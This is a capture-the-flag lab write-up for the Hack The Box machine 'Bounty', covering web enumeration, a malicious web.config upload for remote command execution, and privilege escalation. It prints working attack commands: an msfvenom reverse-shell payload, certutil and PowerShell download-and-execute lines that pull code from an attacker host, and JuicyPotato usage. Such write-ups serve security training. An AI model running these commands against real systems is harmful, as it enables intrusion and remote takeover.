# Summary



## about target

tip:  10.129.50.87

hostname: Bounty

Difficulty: Easy,  Medium



## about attack

+ Web enum, try gobuster -x to enum aspx/php/jsp/html when dir scan no result.
+ File upload test for extensions, aspx file upload rce config.
+ kernel exploit, try Sherlock and win exp suggester.





**attack note**

```bash
bounty / 10.129.50.87

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Bounty


## http enum
Microsoft-IIS/7.5 
exploit, asp & php authentication bypass
https://www.exploit-db.com/exploits/19033

iis_webdav_upload.py, failed. upload 404
https://gist.github.com/mgeeky/ce179cdbe4d8d85979a28c1de61618c2/raw/4693767a8d9fa0a0a73b900debf3f4a7aff5d7dc/iis_webdav_upload.py

iisshort.py, not able to run, import error.
https://github.com/yangbh/Hammer/raw/master/plugins/System/iisshort.py

dir scan 
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -u http://$tip -o gobuster.txt
/uploadedfiels    403

dirb 
dirb http://$tip -o dirb.log
/aspnet_client      403

nikto, nothing found.
nikto -output nikto.txt -host http://$tip

default page src, nothing.

# after check walkthrough 

gobuster with -x aspx

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -e -k
-x asp,aspx -u http://$tip -o gobust-asp.txt

### file upload
extensions: asp, aspx, php, php7, pl, exe, config, cgi

aspx file upload rce config
https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config


msfvenom -p windows/x64/shell_reverse_tcp LHOST=$kip LPORT=4444  EXITFUNC=thread -f exe -o 4444.exe

http://10.129.50.87/uploadedfiles/web.config?cmd=certutil+-urlcache+-split+-f+http%3A%2F%2F10.10.14.62%2F4444.exe+c%3A%5Cwindows%5Csystem32%5Ctasks%5Ctest.exe

c:\windows\system32\tasks\test.exe


## local enum

### no response, don't know reason.
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.62/PowerUp.ps1')"  


certutil -urlcache -split -f http://10.10.14.62/MS11-011.exe


JuicyPotato.exe -t * -p c:\temp\1337.exe -l 9001


cmd /c powershell.exe -c IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.62/rev.ps1')

IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.62/Sherlock.ps1')
result: ms10-092 ms15-051

```







# Enumeration

## nmap scan

light scan

```bash
nmap -p- --min-rate=1000 -T4 -oN nmap.light $tip


```



Heavy scan

```bash
export port=$(cat nmap.light | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//)
sudo nmap -A -O -p$port -sC -sV -T4 -oN nmap.heavy $tip

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Bounty
```

## http enum

dir scan

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -u http://$tip -o gobuster.txt
# /uploadedfiels    403

dirb http://$tip -o dirb.log
# /aspnet_client      403

# nothing
nikto -output nikto.txt -host http://$tip

```

default page src, nothing.

web server, IIS 7.5, exploit

exploit, asp & php authentication bypass; not work
https://www.exploit-db.com/exploits/19033

iis_webdav_upload.py, failed. upload 404; not work.
https://gist.github.com/mgeeky/ce179cdbe4d8d85979a28c1de61618c2/raw/4693767a8d9fa0a0a73b900debf3f4a7aff5d7dc/iis_webdav_upload.py

iisshort.py, not able to run, import error.
https://github.com/yangbh/Hammer/raw/master/plugins/System/iisshort.py



![image-20221007171306603](./images/image-20221007171306603.png)



gobuster with -x to enum aspx

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -e -k
-x asp,aspx -u http://$tip -o gobust-asp.txt
```

/transfer.aspx, upload file.

check upload, file extensions. burpsuite intruder

```bash
asp, apsx, php, php7, pl, cgi, exe, config
```

config is allowed.

![image-20221007212736856](./images/image-20221007212736856.png)



search for exploit, key: aspx file upload rce config

https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config





# Exploitation

download the exploit from payloadallthethings.

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config

upload and access,

http://10.129.50.87/uploadedfiles/web.config?cmd=dir

![image-20221007181533451](./images/image-20221007181533451.png)

get shell.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$kip LPORT=4444  EXITFUNC=thread -f exe -o 4444.exe

http://10.129.50.87/uploadedfiles/web.config?cmd=certutil+-urlcache+-split+-f+http%3A%2F%2F10.10.14.62%2F4444.exe+c%3A%5Cwindows%5Csystem32%5Ctasks%5Ctest.exe

# run
c:\windows\system32\tasks\test.exe

```



![image-20221007182006959](./images/image-20221007182006959.png)

after several minutes,  web.config 404; need to reupload.

http://10.129.50.87/uploadedfiles/web.config?cmd=certutil+-urlcache+-split+-f+http%3A%2F%2F10.10.14.62%2F4444.exe+c%3A%5Cwindows%5Csystem32%5Ctasks%5Ctest.exe



# Privesc



## local Enum

system, 2008 R2 x64

```bash
whoami /all
```

Impersonate enabled.



## Juicypotato

```bash
certutil -urlcache -split -f http://10.10.14.62/JuicyPotato.exe
JuicyPotato.exe -t * -p c:\temp\1337.exe -l 9001
```



![image-20221007201117065](./images/image-20221007201117065.png)



## Kernel exploit

powerup, not running fine.

![image-20221007213524443](./images/image-20221007213524443.png)



Sherlock, works ok.

```bash
cmd /c powershell.exe -c IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.62/rev.ps1')

IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.62/Sherlock.ps1')
## exploit found, ms10-092 ms15-051
```



Windows-exploit-suggester, not good.

```bash
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py -i ~/lab/htb/bounty/sysinfo.txt --database 2022-10-07-mssb.xls  > ~/lab/htb/bounty/winexp.log
```



![image-20221007213614208](./images/image-20221007213614208.png)



## proof

```bash


```



![image-20221007201304220](./images/image-20221007201304220.png)
